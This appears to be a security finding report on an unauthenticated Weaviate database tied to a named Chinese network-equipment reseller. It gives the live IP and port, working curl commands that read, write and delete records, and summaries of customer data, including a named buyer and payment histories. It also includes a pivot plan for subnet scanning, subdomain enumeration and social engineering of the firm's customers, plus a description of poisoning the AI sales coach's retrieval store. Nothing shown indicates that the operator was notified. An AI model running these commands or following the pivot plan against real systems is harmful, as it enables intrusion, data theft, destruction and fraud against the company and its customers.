# itprice.yejian.tech -- Unauth RWD on Weaviate B2B AI CRM

**Date:** 2026-06-20
**Tool:** weavscan
**Severity:** CRITICAL
**Status:** CONFIRMED -- unauth read + write + delete

---

## Target

| Field    | Value                              |
|----------|------------------------------------|
| IP       | 47.238.237.94                      |
| Domain   | api.itprice.yejian.tech            |
| Port     | 8080                               |
| Service  | Weaviate v1.28.4                   |
| Hosting  | Alibaba Cloud (inferred, .yejian.tech) |
| Auth     | NONE                               |

---

## Operator Attribution

**Router-switch.com** -- Chinese B2B reseller of Huawei and Cisco network equipment.

Evidence:
- Class content references "Router-switch.com" by name as "首选供货商" (preferred supplier)
- AI coaching system conducts B2B sales strategy sessions in Chinese
- Customer base includes ISPs and enterprise network buyers (e.g., MTS operator project)
- Order number scheme `SL-MOT-260105-CIS` consistent with internal CRM prefix conventions

---

## Data

### Classes

| Class                          | Objects | Description                         |
|-------------------------------|---------|-------------------------------------|
| `Cmf_ai_data_message_history` | 839     | AI sales coaching conversation logs |

### Schema

| Field             | Type    | Notes                                      |
|-------------------|---------|--------------------------------------------|
| `conversation_id` | integer | Links session to CRM customer record       |
| `text`            | string  | Null in majority of records                |
| `history`         | string  | Full Q&A between salesperson and AI coach  |

### Sample Records

- **Customer 255788** -- "Girum", Ethiopian buyer of Huawei network equipment
- **Order SL-MOT-260105-CIS** -- active deal, Cisco equipment
- **ISP project tracking** -- MTS operator, deal status and competitive positioning
- **Competitor analysis** -- Dell vs Cisco product comparisons, sourced from AI coach
- **5-year payment history** ("近5年到款数据") -- per-customer financial summary
- **Deal recovery tactics** -- AI-generated scripts for re-engaging stalled customers

All records are in Chinese. Content is live operational CRM data, not test fixtures.

---

## Access Matrix

| Operation | Endpoint                                                    | Result         | HTTP |
|-----------|-------------------------------------------------------------|----------------|------|
| Read      | `GET /v1/objects?class=Cmf_ai_data_message_history&limit=1` | 839 objects    | 200  |
| Write     | `POST /v1/objects`                                          | Object created | 200  |
| Delete    | `DELETE /v1/objects/Cmf_ai_data_message_history/<uuid>`     | Object removed | 204  |
| Verify    | `GET /v1/objects/Cmf_ai_data_message_history/<uuid>`        | 404 confirmed  | 404  |

**Canary UUID:** `a86e334e-277f-4b9b-a17f-bf5bc3cb542b`

---

## PoC

### Read -- enumerate class contents

```bash
curl -s "http://47.238.237.94:8080/v1/objects?class=Cmf_ai_data_message_history&limit=5" \
  | jq '.objects[] | {id, conversation_id: .properties.conversation_id, preview: .properties.history[:120]}'
```

### Write -- inject canary object

```bash
curl -s -X POST "http://47.238.237.94:8080/v1/objects" \
  -H "Content-Type: application/json" \
  -d '{
    "class": "Cmf_ai_data_message_history",
    "id": "a86e334e-277f-4b9b-a17f-bf5bc3cb542b",
    "properties": {
      "conversation_id": 999999,
      "text": null,
      "history": "NUCLIDE-CANARY-2026-06-20"
    }
  }'
```

### Delete -- confirm destructive access

```bash
curl -s -o /dev/null -w "%{http_code}" -X DELETE \
  "http://47.238.237.94:8080/v1/objects/Cmf_ai_data_message_history/a86e334e-277f-4b9b-a17f-bf5bc3cb542b"
# returns 204

curl -s -o /dev/null -w "%{http_code}" \
  "http://47.238.237.94:8080/v1/objects/Cmf_ai_data_message_history/a86e334e-277f-4b9b-a17f-bf5bc3cb542b"
# returns 404 -- object gone
```

---

## Impact

### Confidentiality -- 839 B2B sales conversations exposed

Every AI coaching session is readable without authentication. Records include customer identities, deal values, order numbers, 5-year payment histories, competitor analysis, and deal recovery scripts. This is the operator's complete CRM conversation corpus. Competitors, ex-employees, or any party with a port scan can read it.

### Integrity -- AI coaching injection

Write access allows injecting false coaching advice into the vector store. A salesperson querying the AI coach could receive instructions to offer unauthorized discounts, cite incorrect product specifications, or direct customer contacts to attacker-controlled channels. The AI retrieves from this store -- poisoned records become poisoned recommendations.

### Availability -- full wipe

Delete access with no auth gate means the entire 839-object knowledge base can be destroyed in a single loop. No backup mechanism is visible from the external surface. Loss of this store breaks the AI sales coaching tool.

### Business intelligence leak

Order number format `SL-MOT-260105-CIS` reveals the internal naming convention. Combined with customer IDs and deal context, this is sufficient for targeted social engineering against Router-switch.com customers and sales staff.

---

## Pivot Avenues

1. `itprice.yejian.tech` (main domain, port 80/443) -- check for admin portal, additional API routes, authentication surface
2. Customer ID 255788 and others in the corpus -- if a CRM platform is co-hosted, enumerate customer records directly
3. Order number format `SL-MOT-260105-CIS` -- internal naming convention usable for social engineering or deal tracking inference
4. Alibaba Cloud subnet (47.238.0.0/16) -- scan adjacent hosts for co-located services under the same operator
5. `yejian.tech` apex domain -- enumerate subdomains for additional services (DNS brute, cert transparency)

---

## Tool Reference

**weavscan** -- https://nuclide-research.com/tools/weavscan
